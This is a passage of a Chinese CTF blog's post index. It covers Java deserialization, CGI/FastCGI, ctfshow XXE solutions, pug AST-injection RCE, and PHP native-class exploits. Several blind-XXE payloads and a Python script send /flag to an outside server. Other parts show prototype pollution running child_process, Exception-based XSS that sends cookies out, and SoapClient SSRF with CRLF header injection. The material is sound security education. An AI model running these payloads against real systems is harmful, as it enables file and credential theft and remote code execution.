public static void unserialize(Object obj) throws IOException, ClassNotFoundException { ObjectInputStream ois = new ObjectInputStream(new FileInputStream(&quot;ser.bin&quot;)); ois.readObject(); }} 参考： 白日梦组长(非常推荐这位up主) ErYao7","link":"/2023/11/06/CommonsCollections/"},{"title":"cgi，php-cgi，fastcgi 、php-fpm之间的关系","text":"前言在做一道ssrf题目时，提到了有关于FastCGI、PHP-FPM，不知道是什么东东 引出概念在整个网站架构中，Web Server（如Apache、Nginx）只是内容的分发者。举个栗子，如果客户端请求的是 index.html，那么Web Server会去文件系统中找到这个文件，发送给浏览器，这里分发的是静态数据。 如果请求的是 index.php，根据配置文件，Web Server知道这个不是静态文件，需要去找 PHP 解析器来处理，那么他会把这个请求简单处理，然后交给PHP解析器。 当Web Server收到index.php 这个请求后，会启动对应的 CGI 程序，这里就是PHP的解析器。接下来PHP解析器会解析php.ini文件，初始化执行环境，然后处理请求，再以规定CGI规定的格式返回处理后的结果，退出进程，Web server再把结果返回给浏览器。这就是一个完整的动态PHP Web访问流程，接下来再引出这些概念，会好理解很多。 CGI：是 Web Server 与 Web Application 之间数据交换的一种协议。 FastCGI：同 CGI，是一种通信协议，但比 CGI 在效率上做了一些优化。 PHP-CGI：是 PHP （Web Application）对 Web Server 提供的 CGI 协议的接口程序。 PHP-FPM：是 PHP（Web Application）对 Web Server 提供的 FastCGI 协议的接口程序，额外还提供了相对智能一些任务管理。 （Web Server 一般指Apache、Nginx、IIS、Tomcat等服务器，Web Application 一般指PHP、Java、Asp.net等应用程序） 概念1、CGICGI（Common Gateway Interface）全称是“通用网关接口”，WEB 服务器与PHP应用进行“交谈”的一种工具，其程序须运行在网络服务器上。CGI可以用任何一种语言编写，只要这种语言具有标准输入、输出和环境变量。如php、perl、tcl等。 WEB服务器会传哪些数据给PHP解析器呢？URL、查询字符串、POST数据、HTTP header都会有。所以，CGI就是规定要传哪些数据，以什么样的格式传递给后方处理这个请求的协议。也就是说，CGI就是专门用来和 web 服务器打交道的。web服务器收到用户请求，就会把请求提交给cgi程序（如php-cgi），cgi程序根据请求提交的参数作应处理（解析php），然后输出标准的html语句，返回给web服服务器，WEB服务器再返回给客户端，这就是普通cgi的工作原理。（cgi程序，你就可以理解成遵循cgi协议编写的程序） 优点： CGI的好处就是完全独立于任何服务器，仅仅是做为中间分子。提供接口给web服务器和web应用(如提nginx和php)。他们通过cgi搭线来完成数据传递。这样做的好处了尽量减少2个的关联，使他们2变得更独立。 缺点： 但是CGI有个难受的地方，就是每一次web请求都会有启动和退出过程，也就是最为人诟病的fork-and-execute模式，这样一在大规模并发下，就死翘翘了。 2、FastCGI从根本上来说，FastCGI是用来提高CGI程序性能的。类似于CGI，FastCGI也可以说是一种协议。 FastCGI像是一个常驻(long-live)型的CGI，它可以一直执行着，只要激活后，不会每次都要花费时间去fork一次。 FastCGI是和语言无关的、可伸缩架构的CGI开放扩展，其主要行为是将CGI解释器进程保持在内存中，并因此获得较高的性能。众所周知，CGI解释器的反复加载是CGI性能低下的主要原因，如果CGI解释器保持在内存中，并接受FastCGI进程管理器调度，则可以提供良好的性能、伸缩性、Fail- Over特性等等。 举例： 当web server收到/index.php请求，看一下CGI程序和FastCGI程序分别是怎么处理的： CGI：当收到web server请求后，会启动对应的CGI程序，这里就是PHP的解析器（php-cgi）。接下来PHP解析器会解析php.ini文件，初始化执行环境，然后处理请求，再以规定的CGI规定的格式返回处理后的结果，退出进程。（CGI每次接收到请求都会执行这些步骤） FastCGI：首先，FastCGI程序会先启动一个master，解析配置环境，初始化执行环境，然后再启动多个worker。当请求过来时，master会传递给一个worker，然后立即可以接受下一个请求。这样就避免了重复的劳动，效率自然是高。而且当worker不够用时，master可以根据配置预先启动几个worker等着；当然空闲worker太多时，也会停掉一些，这样就提高了性能，也节约了资源，这就是fastcgi对进程的管理。（CGI程序和FastCGI程序，可以理解成遵循CGI协议和FastCGI协议编写的程序） FastCGI的工作原理： FastCGI接口方式采用C/S结构，可以将HTTP服务器和脚本解析服务器分开，同时在脚本解析服务器上启动一个或者多个脚本解析守护进程。当HTTP服务器每次遇到动态程序时，可以将其直接交付给FastCGI进程来执行，然后将得到的结果返回给浏览器。这种方式可以让HTTP服务器专一地处理静态请求，或者将动态脚本服务器的结果返回给客户端，这在很大程度上提高了整个应用系统的性能。 （1）Web Server启动时载入FastCGI进程管理器（Apache Module或IIS ISAPI等) （2）FastCGI进程管理器自身初始化，启动多个CGI解释器进程(可建多个php-cgi)，并等待来自Web Server的连接。 （3）当客户端请求到达Web Server时，FastCGI进程管理器选择并连接到一个CGI解释器。Web server将CGI环境变量和标准输入发送到FastCGI子进程php-cgi。 （4）FastCGI子进程完成处理后，将标准输出和错误信息从同一连接返回Web Server。当FastCGI子进程关闭连接时，请求便告处理完成。FastCGI子进程接着等待，并处理来自FastCGI进程管理器(运行在Web Server中)的下一个连接。在CGI模式中，php-cgi在此便退出了。 CGI与FastCGI比较： （1）对于CGI来说，每一个Web请求PHP都必须重新解析php.ini、重新载入全部扩展，并重新初始化全部数据结构。而使用FastCGI，所有这些都只在进程启动时发生一次。一个额外的好处是，持续数据库连接(Persistent database connection)可以工作。 （2）由于FastCGI是多进程，所以比CGI多线程消耗更多的服务器内存，php-cgi解释器每进程消耗7至25兆内存，将这个数字乘以50或100就是很大的内存数。 3、PHP-FPM首先要说的是：fastcgi是一个协议，php-fpm实现了这个协议。 大家都知道，PHP的解释器是php-cgi。php-cgi只是个CGI程序，他自己本身只能解析请求，返回结果，不会进程管理，所以就出现了一些能够调度php-cgi进程的程序，php-fpm就是这样的一个东西。它克服了php-cgi变更php.ini配置后，需重启php-cgi才能让新的php-ini生效，不可以平滑重启，直接杀死php-cgi进程，php就不能运行了的问题。修改php.ini之后，php-cgi进程的确没办法平滑重启的。php-fpm对此的处理机制是新的worker用新的配置，已经存在的worker处理完手上的活就可以歇着了，通过这种机制来平滑过度。 php-fpm提供了更好的php进程管理方式，可以有效的控制内存和进程，可以平滑重载php配置。 总结一下这个升级的过程： 如果要搭建一个高性能的PHP WEB服务器，目前最佳的方式是Apache/Nginx + FastCGI + PHP-FPM(+PHP-CGI)方式了。 结尾这篇文章转载于 大佬 我在我的vps中nginx用的就是 fastcgi+php-fpm 1234location ~ \\.php$ { include snippets/fastcgi-php.conf; fastcgi_pass unix:/var/run/php/php7.4-fpm.sock;}","link":"/2023/11/08/cgi%EF%BC%8Cphp-cgi%EF%BC%8Cfastcgi%20%E3%80%81php-fpm%E4%B9%8B%E9%97%B4%E7%9A%84%E5%85%B3%E7%B3%BB/"},{"title":"XXE漏洞","text":"什么是xxe漏洞？XXE全称是XML External Entity Injection，即外部实体注入。XXE是针对应用程序解析XML输入类型的攻击。当包含对外部实体的引用的 XML输入被弱配置的 XML 解析器处理时，就会发生这种攻击。这种攻击可能导致机密数据泄露、拒绝服务、服务器端请求伪造。 什么是XML? XML 指可扩展标记语言（EXtensible Markup Language）。 XML 是一种很像HTML的标记语言。 XML 的设计宗旨是传输数据，而不是显示数据。 XML 标签没有被预定义。您需要自行定义标签。 XML 被设计为具有自我描述性。 XML实列XML 文档第一行以 XML 声明开始，用来表述文档的一些信息，如： 1&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt; 标签必须成对出现，有开始标签就需要有结束标签， XML 标签没有被预定义，通过 XML 您可以发明自己的标签，列如下面的 “site”,”name”,”url”,”desc”都是自定义的标签 XML 必须包含根元素，它是所有其他元素的父元素。下面案例中的根元素就是“site” 123456&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;site&gt; &lt;name&gt;zIxyd&lt;/name&gt; &lt;url&gt;https://zixyd.github.io&lt;/url&gt; &lt;desc&gt;Blog&lt;/desc&gt;&lt;/site&gt; 什么是DTD？Document Type Definition 文档类型定义 DTD文件一般和XML文件配合使用，主要是为了约束XML文件。 XML文件引入DTD文件，这样XML可以自定义标签，但又受到DTD文件的约束 基本语法： 1&lt;!ELEMENT 元素名 类型&gt; DTD实列编写一个名为myClass.dtd的dtd文件 12345&lt;!ELEMENT 班级 (学生+)&gt;&lt;!ELEMENT 学生 (名字,年龄,介绍)&gt;&lt;!ELEMENT 名字 (#PCDATA)&gt;&lt;!ELEMENT 年龄 (#PCDATA)&gt;&lt;!ELEMENT 介绍 (#PCDATA)&gt; 编写一个xml文件并引入dtd文件 123456789101112131415&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;!--引入dtd文件，约束这个xml--&gt;&lt;!DOCTYPE 班级 SYSTEM &quot;myClass.dtd&quot;&gt;&lt;班级&gt; &lt;学生&gt; &lt;名字&gt;周小星&lt;/名字&gt; &lt;年龄&gt;23&lt;/年龄&gt; &lt;介绍&gt;学习刻苦&lt;/介绍&gt; &lt;/学生&gt; &lt;学生&gt; &lt;名字&gt;林晓&lt;/名字&gt; &lt;年龄&gt;25&lt;/年龄&gt; &lt;介绍&gt;是一个好学生&lt;/介绍&gt; &lt;/学生&gt; &lt;/班级&gt; 引入中写的：SYSTEM，表示当前的DTD文件是本地的 如果写的是PUBLIC，则表示引入的DTD文件是来自于网络的. DTD文档的声明及引用1.内部DTD文档1&lt;!DOCTYPE 根元素 [定义内容]&gt; 2.外部DTD文档引入外部的DTD文档分为两种： （1）当引用的DTD文件是本地文件的时候，用SYSTEM标识，并写上”DTD的文件路径”，如下： 1&lt;!DOCTYPE 根元素 SYSTEM &quot;DTD文件路径&quot;&gt; （2）如果引用的DTD文件是一个公共的文件时，采用PUBLIC标识，如下方式： 1&lt;!DOCTYPE 根元素 PUBLIC &quot;DTD名称&quot; &quot;DTD文件的URL&quot;&gt; 补充关键(ENTITY)ENTITY属性：实体用于为一段内容创建一个别名，以后在XML文档中就可以使用别名引用这段内容了。 1,引用实体 1&lt;!ENTITY 实体名称 &quot;实体内容&quot;&gt; 举例 123&lt;!ENTITY copyright &quot;I am a programmer&quot;&gt;....&amp;copyright; 2,参数实体 1&lt;!ENTITY % 实体名称 &quot;实体内容&quot;&gt; 举例 1234567&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!ELEMENT person (name,addr,tel,br,email)&gt;&lt;!ENTITY %name &quot;(#PCDATA)&quot;&gt;&lt;!ELEMENT addr %name;&gt;&lt;!ELEMENT tel %name;&gt;&lt;!ELEMENT br EMPTY&gt;&lt;!ELEMENT email %name;&gt; CTFSHOW_XMLweb373(入门xml)123456789101112&lt;?phperror_reporting(0);libxml_disable_entity_loader(false);$xmlfile = file_get_contents('php://input');if(isset($xmlfile)){ $dom = new DOMDocument(); $dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD); $creds = simplexml_import_dom($dom); $ctfshow = $creds-&gt;ctfshow; echo $ctfshow;}highlight_file(__FILE__); 1, libxml_disable_entity_loader函数可以加载外部实体 1可选。禁用 (TRUE) 或启用 (FALSE) libxml 扩展以加载外部实体。 默认为真 2, **file_get_contents(‘php://input’)**接受POST数据 3, simplexml_import_dom 函数把 DOM 节点转换为 SimpleXMLElement 对象 1234567&lt;?php$dom = new domDocument();$dom-&gt;loadXML('&lt;note&gt;&lt;from&gt;John&lt;/from&gt;&lt;/note&gt;');$xml = simplexml_import_dom($dom);echo $xml-&gt;from;?&gt; //输出John payload 123456789&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE any [&lt;!ENTITY xxe SYSTEM &quot;file:///flag&quot;&gt;]&gt;&lt;anything&gt; &lt;ctfshow&gt; &amp;xxe; &lt;/ctfshow&gt;&lt;/anything&gt; web374 (无回显)123456789&lt;?phperror_reporting(0);libxml_disable_entity_loader(false);$xmlfile = file_get_contents('php://input');if(isset($xmlfile)){ $dom = new DOMDocument(); $dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);}highlight_file(__FILE__); 利用ENTITY中的参数实体 为区分嵌套实体和实体之间的关系，可以通过单双引号来间隔开，引号中嵌套一个参数实体，其%号需要写成：%也可写为16进制的% 只要明白参数实体，payload不就难理解 先在vps上创建一个dtd文件 123&lt;!ENTITY %dtd &quot;&lt;!ENTITY &amp;#x25; xxe SYSTEM 'http://81.71.13.76:5050/%file'&gt;&quot;&gt;%dtd;%xxe; 再vps利用nc监听端口 5050，再发送xml数据 1234567&lt;!DOCTYPE ANY [&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=/flag&quot;&gt;&lt;!ENTITY % aaa SYSTEM &quot;http://81.71.13.76:8080/xml.dtd&quot;&gt;%aaa;]&gt;&lt;!--XML 必须包含根元素--&gt;&lt;root&gt;1&lt;/root&gt;&lt;&gt; 为什么不直接将dtd文件放到xml数据中，而必须去引入？不可以写成写成下面这种形式？ 1234567&lt;!DOCTYPE ANY [&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=/flag&quot;&gt;&lt;!ENTITY %dtd &quot;&lt;!ENTITY &amp;#x25; xxe SYSTEM 'http://81.71.13.76:5050/%file'&gt;&quot;&gt;%dtd;%xxe;]&gt;&lt;root&gt;1&lt;/root&gt; web375 -web376(无回显,过滤了&lt;?xml version=”1.0”) XML的声明是可以省略的，所以和374是一样的解法 12345678910111213&lt;?phperror_reporting(0);libxml_disable_entity_loader(false);$xmlfile = file_get_contents('php://input');if(preg_match('/&lt;\\?xml version=&quot;1\\.0&quot;/', $xmlfile)){ die('error');}if(isset($xmlfile)){ $dom = new DOMDocument(); $dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);}highlight_file(__FILE__); web377(无回显,过滤了&lt;?xml version=”1.0”和“http”) 123456789101112&lt;?phperror_reporting(0);libxml_disable_entity_loader(false);$xmlfile = file_get_contents('php://input');if(preg_match('/&lt;\\?xml version=&quot;1\\.0&quot;|http/i', $xmlfile)){ die('error');}if(isset($xmlfile)){ $dom = new DOMDocument(); $dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);}highlight_file(__FILE__); 一个xml文档不仅可以用UTF-8编码，也可以用UTF-16(两个变体 - BE和LE)、UTF-32(四个变体 - BE、LE、2143、3412)和EBCDIC编码。 在这种编码的帮助下，使用正则表达式可以很容易地绕过WAF，因为在这种类型的WAF中，正则表达式通常仅配置为单字符集。 外来编码也可用于绕过成熟的WAF，因为它们并不总是能够处理上面列出的所有编码。例如，libxml2解析器只支持一种类型的utf-32 - utf-32BE，特别是不支持BOM。 意思是可以对xml文档UTF-16编码 123456789import requestsurl = 'http://f20c0eb6-2aea-496b-8411-94f78f0ae0a4.challenge.ctf.show/'data = '''&lt;!DOCTYPE ANY [&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=/flag&quot;&gt;&lt;!ENTITY % aaa SYSTEM &quot;http://81.71.13.76:8080/xml.dtd&quot;&gt;%aaa;]&gt;&lt;root&gt;1&lt;/root&gt;'''r = requests.post(url=url,data=data.encode('utf-16')) web378 尝试弱密码登陆，显示登陆成功却没有反应，用bp抓包,很明显是xml数据 1&lt;user&gt;&lt;username&gt;admin&lt;/username&gt;&lt;password&gt;admin&lt;/password&gt;&lt;/user&gt; payload: 123456789101112&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE any [&lt;!ENTITY xxe SYSTEM &quot;file:///flag&quot;&gt;]&gt;&lt;user&gt; &lt;username&gt; &amp;xxe; &lt;/username&gt; &lt;password&gt; admin &lt;/password&gt;&lt;/user&gt; 防范XXE 禁用 XML 解析器中的外部实体处理 验证传入的 XML 数据，以确保其仅包含允许的实体 使用安全的库和 API 处理 XML 数据 实施适当的输入验证，防止恶意的 XML 输入","link":"/2023/11/09/XXE/"},{"title":"AST Injection","text":"模版引擎是什么JS web开发中常用的模版引擎如 ejs、pug、handlebars 功能：动态渲染HTML代码，创建可重复使用的页面结构 ejs 模版使用123456789101112131415// 安装EJS模块：npm install ejs// 引入EJS模块const ejs = require('ejs');// 定义模板const template = ` &lt;h1&gt;Hello, &lt;%= name %&gt;!&lt;/h1&gt;`;// 渲染模板const data = { name: 'John' };const html = ejs.render(template, data);console.log(html); handlebars 模版使用123456789101112131415161718// 安装Handlebars模块：npm install handlebars// 引入Handlebars模块const handlebars = require('handlebars');// 定义模板const template = ` &lt;h1&gt;Hello, {{name}}!&lt;/h1&gt;`;// 编译模板const compiledTemplate = handlebars.compile(template);// 渲染模板const data = { name: 'John' };const html = compiledTemplate(data);console.log(html); pug 模版使用123456789101112131415161718// 安装Pug模块：npm install pug// 引入Pug模块const pug = require('pug');// 定义模板const template = ` h1 Hello, #{name}!`;// 编译模板const compiledTemplate = pug.compile(template);// 渲染模板const data = { name: 'John' };const html = compiledTemplate(data);console.log(html); 总结：可以看到模版引擎其实都有各自的一些特定语法规则，比如 pug 中可以通过 #{name} 来引用外部环境的变量， ejs 则是 \\&lt;%= name %&gt;。通过这种方式简化html代码的编写，同时实现模版重用 模版引擎的工作原理本质上，引擎是通过针对你使用模版语言编写的模版进行解析，从而生成新的JS代码。大题过程可以概括如下： 1词法解析 -&gt; 语法解析 -&gt; 代码生成 但是在语法树处理的过程中，在处理节点的时候，存在大量的赋值、循环操作，而在大部分模版引擎中，都是这么写的： 123456789attrs[name] = attrs[value] if(ast.block){}for(var i in node){} 赋值操作未判断对应的属性是否为对象自身的属性，导致访问到原型链的 Object.prototype 的属性 判断某个属性是否存在，同样未判断是否为对象自身属性是否存在，若存在原型链污染，则可以进入if判断 JS的 for…in 循环会遍历对象的所有可枚举属性，包括原型链上的属性。例如： 12345let obj = { a: 1, b: 2 };obj.__proto__.c = 3;for (let i in obj) { console.log(i); // a, b, c} 因此若存在原型链污染，则可以随意修改AST树，进而影响生成的代码，最终达到RCE（远程代码执行）的目的 需要注意的是： AST树的生成本质上是影响生成的字符串，因此也可以导致XSS漏洞 代码执行的那一步才会导致RCE，这时候需要第一步通过原型链污染注入代码，进而影响生成的代码 pug template AST injection1234567891011const pug = require('pug');// 模拟原型链污染Object.prototype.block = {&quot;type&quot;:&quot;Text&quot;,&quot;val&quot;:`&lt;script&gt;alert(origin)&lt;/script&gt;`};const source = `h1= msg`;var fn = pug.compile(source, {});var html = fn({msg: 'It works'});console.log(html); // &lt;h1&gt;It works&lt;script&gt;alert(origin)&lt;/script&gt;&lt;/h1&gt; 当执行到 fn({msg: 'It works'}); 这一步的时候，本质上是进入了一段函数 打印出这段函数的代码，可以看到通过原型链污染我们实现了向生成代码中插入一段字符串 12345678910111213141516(function anonymous(pug) {function template(locals) {var pug_html = &quot;&quot;, pug_mixins = {}, pug_interp;var pug_debug_filename, pug_debug_line;try {; var locals_for_with = (locals || {}); (function (msg) { ;pug_debug_line = 1;pug_html = pug_html + &quot; h1\\u003E&quot;;;pug_debug_line = 1;pug_html = pug_html + (pug.escape(null == (pug_interp = msg) ? &quot;&quot; : pug_interp)) + &quot; script\\u003Ealert(origin) \\u002Fscript\\u003E \\u002Fh1\\u003E&quot;; }.call(this, &quot;msg&quot; in locals_for_with ? locals_for_with.msg : typeof msg !== 'undefined' ? msg : undefined)); ;} catch (err) {pug.rethrow(err, pug_debug_filename, pug_debug_line);};return pug_html;}return template;}) 原理分析(以pug为例)语法树结构 pug 解析 h1= msg ，生成的语法树结构： 1234567891011121314151617181920212223242526272829303132333435{ &quot;type&quot;:&quot;Block&quot;, &quot;nodes&quot;:[ { &quot;type&quot;:&quot;Tag&quot;, &quot;name&quot;:&quot;h1&quot;, &quot;selfClosing&quot;:false, &quot;block&quot;:{ &quot;type&quot;:&quot;Block&quot;, &quot;nodes&quot;:[ { &quot;type&quot;:&quot;Code&quot;, &quot;val&quot;:&quot;msg&quot;, &quot;buffer&quot;:true, &quot;mustEscape&quot;:true, &quot;isInline&quot;:true, &quot;line&quot;:1, &quot;column&quot;:3 } ], &quot;line&quot;:1 }, &quot;attrs&quot;:[ ], &quot;attributeBlocks&quot;:[ ], &quot;isInline&quot;:false, &quot;line&quot;:1, &quot;column&quot;:1 } ], &quot;line&quot;:0} 语法树执行顺序以刚刚生成的语法树结构举例，解析顺序为： Block Tag Block Code …… 注意第4步解析 node.Type 为 Code 类型，会执行如下代码： 12345case 'Code': case 'While': if (ast.block) { // 注意这里 ast.block = walkAST(ast.block, before, after, options); } 判断 ast.block 属性是否存在，此处的 ast 即当前ast语法树的节点 如果存在，继续递归解析 block 结合原型链污染如果某处存在原型链污染漏洞，使得 1Object.prototype.block = {&quot;type&quot;:&quot;Text&quot;,&quot;val&quot;:`&lt;script&gt;alert(origin)&lt;/script&gt;`}; 那么 ast.block 就会访问到 ast.__proto__.block ，即Object.prototype.block 的属性 此时代码输出结果，导致了XSS 12345678910const pug = require('pug');Object.prototype.block = {&quot;type&quot;:&quot;Text&quot;,&quot;val&quot;:`&lt;script&gt;alert(origin)&lt;/script&gt;`};const source = `h1= msg`;var fn = pug.compile(source, {});var html = fn({msg: 'It works'});console.log(html); // &lt;h1&gt;It works&lt;script&gt;alert(origin)&lt;/script&gt;&lt;/h1&gt; RCE我们知道pug本质上是将一段代码，如 h1 =msg 编译为一段js代码，背后其实就是生成语法树+ new Function 因此如果能通过AST Injection插入节点，并使之成为代码，即可达到远程代码执行的目的。 刚好pug中就有如下代码： 12345678910// /node_modules/pug-code-gen/index.js if (debug &amp;&amp; node.debug !== false &amp;&amp; node.type !== 'Block') { if (node.line) { var js = ';pug_debug_line = ' + node.line; if (node.filename) js += ';pug_debug_filename = ' + stringify(node.filename); this.buf.push(js + ';'); } } 那么我们通过 AST Injection + Prototype Pollution 即可实现RCE 12345678910const pug = require('pug');Object.prototype.block = {&quot;type&quot;:&quot;Text&quot;,&quot;line&quot;:`console.log(process.mainModule.require('child_process').execSync('id').toString())`};const source = `h1= msg`;var fn = pug.compile(source, {});var html = fn({msg: 'It works'});console.log(html);","link":"/2023/11/18/Ast_Jnigection/"},{"title":"PHP_原生类利用","text":"前言总结php中反序列化时会用到的原生类；php中内置很多原生的类，在CTF中常以echo new $a($b);这种形式出现，当看到这种关键字眼时，就要考虑本题是不是需要原生类利用了。 目录遍历类DirectoryIterator这个类会创建一个指定目录的迭代器，当遇到echo输出时会触发Directorylterator中的__toString()方法，输出指定目录里面经过排序之后的第一个文件名，而一般情况第一个文件都是点号。没什么用，但是Directorylterator可以配合glob协议使用；与glob://协议结合将无视open_basedir对目录的限制 12345678&lt;?phpecho new DirectoryIterator(&quot;./&quot;);echo &quot;\\n&quot;;echo new DirectoryIterator(&quot;glob://f*&quot;);?&gt;#.#flag FilesystemIterator该类继承于Directorylterator，所以在用法上基本也是一样的。 GlobIterator通过类名也不难看出，这是个自带glob协议的类，所以调用时就不必再加上glob://了 12345&lt;?phpecho new GlobIterator(&quot;./f*&quot;);?&gt;#flag 文件读取类SplFileObject当用文件目录遍历到了敏感文件时，可以用SplFileObject类，同样通过echo触发SplFileObject中的__toString()方法。(该类不支持通配符，所以必须先获取到完整文件名称才行) 除此之外其实SplFileObject类，只能读取文件的第一行内容，如果想要全部读取就需要用到foreach函数，但若题目中没有给出foreach函数的话，就要用伪协议读取文件的内容 12345&lt;?phpecho new SplFileObject(&quot;./flag.php&quot;);echo &quot;\\n&quot;;echo new SplFileObject(&quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;);?&gt; 输出如下: 123&lt;?phpPD9waHANCiRmbGFnID0gImZsYWd7ekl4eWRfaXNfaGFja2VyfSI7DQo/Pg== base64解码： 123&lt;?php$flag = &quot;flag{zIxyd_is_hacker}&quot;;?&gt; 报错类Error/ExceptionERROR 适用于php7版本Error类就是php的一个内置类用于自动自定义一个Error，它内置有一个toString的方法。EXCEPTION 适用于php5、7版本这个类利用的方式和原理和Error 类一模一样，但是适用于php5和php7，相对之下更加好用 Error/Exception_XSS[BJDCTF 2nd]xss之光 扫后台，有.git 泄露,githack下载下来 123&lt;?php$a = $_GET['yds_is_so_beautiful'];echo unserialize($a); 源码只有这三行；可触发序列化中的魔术方法__toString 1234567891011121314151617&lt;?php$y1ng = new Exception(&quot;&lt;script&gt;window.open('url/?'+document.cookie);&lt;/script&gt;&quot;);echo urlencode(serialize($y1ng));?&gt;//window.open 是 javaScript 打开新窗口的方法#也可以用window.location.href='url'来实现恶意跳转&lt;?php$a = new Exception(&quot;&lt;script&gt;window.location.href='url'+document.cookie&lt;/script&gt;&quot;);echo urlencode(serialize($a));?&gt;#或者用alert(document.cookie)直接弹出cookie，但此题不行，可能开了httponly。&lt;?php$y1ng = new Exception(&quot;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&quot;);echo urlencode(serialize($y1ng));?&gt; flag就在cookies中 Error/Exception_绕过哈希比较12345678910111213141516171819&lt;?php$a = new Exception(&quot;deadbeef&quot;,1);$b = new Exception(&quot;deadbeef&quot;,2);echo $a;echo &quot;\\n&quot;;echo $b;echo &quot;\\n&quot;;if($a != $b){ echo &quot;a!=b&quot;.&quot;\\n&quot;;}if(md5($a) === md5($b)){ echo &quot;md5相等&quot;.&quot;\\n&quot;;}if(sha1($a)=== sha1($b)){ echo &quot;sha1相等&quot;;}?&gt; 123456789Exception: deadbeef in E:\\phpstudy\\phpstudy_pro\\WWW\\test.php:2Stack trace:#0 {main}Exception: deadbeef in E:\\phpstudy\\phpstudy_pro\\WWW\\test.php:2Stack trace:#0 {main}a!=bmd5相等sha1相等 当变量a,b同时触发__toString()方法时，虽对象不同，但执行__toString()方法后，返回结果相同；这里需要注意a,b赋值时，必须要在同一行上，因为执行__toString()方法时会返回行号。虽然强碰撞也可以绕过，但是还是不如用报错类绕过的好，强碰撞绕过的字符非常长，如果对字符长度做了限制的话可以考虑利用报错类绕过哈希比较 其他类ReflectionMethod 获取类方法的相关信息可以结合getDocComment() 方法，用它来获取类中各个函数注释内容 123456789101112131415&lt;?phphighlight_file(__FILE__);error_reporting(0);class Sentiment{ /** flag{zIxyd_is_hacker} */public function a(){ }}$a = $_GET['a'];$b = $_GET['b'];$c= $_GET['c'];$d=new $a($b,$c);var_dump($d-&gt;getDocComment());?&gt; 12http://127.0.0.1/test.php?a=ReflectionMethod&amp;b=Sentiment&amp;c=a#E:\\phpstudy\\phpstudy_pro\\WWW\\test.php:14: string(28) &quot;/** flag{zIxyd_is_hacker} */&quot; SoapClient 类进行 SSRFPHP 的内置类 SoapClient 是一个专门用来访问web服务的类，SOAP 协议是一种基于 XML 的协议,用于在 Web 应用程序之间进行交互，主要用于 Web 服务;WSDL:是一种 XML 文档，用于描述 Web 服务。 该内置类有一个 __call 方法，当 __call 方法被触发后，它可以发送 HTTP 和 HTTPS 请求。正是这个 __call 方法，使得 SoapClient 类可以被我们运用在 SSRF 中。 该类的构造函数如下： 1public SoapClient :: SoapClient(mixed $wsdl [，array $options ]) 第一个参数是用来指明是否是wsdl模式，将该值设为null则表示非wsdl模式。 第二个参数为一个数组，如果在wsdl模式下，此参数可选；如果在非wsdl模式下，则必须设置location和uri选项，其中location是要将请求发送到的SOAP服务器的URL，而uri 是SOAP服务的目标命名空间。 123456&lt;?php$a = new SoapClient(null,array('uri'=&gt;'zIxy', 'location'=&gt;'http://81.71.13.76:6666/'));$b = serialize($a);echo $b;$c = unserialize($b);$c-&gt;not_exists_function(); 1234567891011ubuntu@zIxyd:~$ nc -lnnp 6666POST / HTTP/1.1Host: 81.71.13.76:6666Connection: Keep-AliveUser-Agent: PHP-SOAP/7.3.4Content-Type: text/xml; charset=utf-8SOAPAction: &quot;zIxy#not_exists_function&quot;Content-Length: 383&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;SOAP-ENV:Envelope xmlns:SOAP-ENV=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot; xmlns:ns1=&quot;zIxy&quot; xmlns:xsd=&quot;http://www.w3.org/2001/XMLSchema&quot; xmlns:SOAP-ENC=&quot;http://schemas.xmlsoap.org/soap/encoding/&quot; SOAP-ENV:encodingStyle=&quot;http://schemas.xmlsoap.org/soap/encoding/&quot;&gt;&lt;SOAP-ENV:Body&gt;&lt;ns1:not_exists_function/&gt;&lt;/SOAP-ENV:Body&gt;&lt;/SOAP-ENV:Envelope&gt; 从结果我们可以看到SOAPAction参数可控，我们可以在SOAPAction处注入恶意的换行，这样一来我们POST提交的header就是可控的，我们就可以通过注入来执行我们想要执行的操作了。 尝试传入token,发现新的问题，Content-Type在SOAPAction的上面，就无法控制Content-Type,也就不能控制POST的数据 在header里User-Agent在Content-Type前面，通过user_agent同样可以注入CRLF,控制Content-Type的值 CRLF Injection 尝试控制token 12345678910111213141516&lt;?php$target = 'http://81.71.13.76:6666';$post_string = 'token=ly0n';$headers = array( 'X-Forwarded-For: 127.0.0.1', );$b = new SoapClient(null,array('location' =&gt; $target,'user_agent'=&gt;'zIxyd^^Content-Type: application/x-www-form-urlencoded^^'.join('^^',$headers).'^^Content-Length: '.(string)strlen($post_string).'^^^^'.$post_string,'uri' =&gt; &quot;aaab&quot;));$aaa = serialize($b);$aaa = str_replace('^^',&quot;\\r\\n&quot;,$aaa);$aaa = str_replace('&amp;','&amp;',$aaa);echo $aaa;$c = unserialize($aaa);$c-&gt;not_exists_function();?&gt; 12345678910111213141516ubuntu@zIxyd:~$ nc -lnnp 6666POST / HTTP/1.1Host: 81.71.13.76:6666Connection: Keep-AliveUser-Agent: zIxydContent-Type: application/x-www-form-urlencodedX-Forwarded-For: 127.0.0.1Content-Length: 11token=zIxydContent-Type: text/xml; charset=utf-8SOAPAction: &quot;aaab#not_exists_function&quot;Content-Length: 383&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;SOAP-ENV:Envelope xmlns:SOAP-ENV=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot; 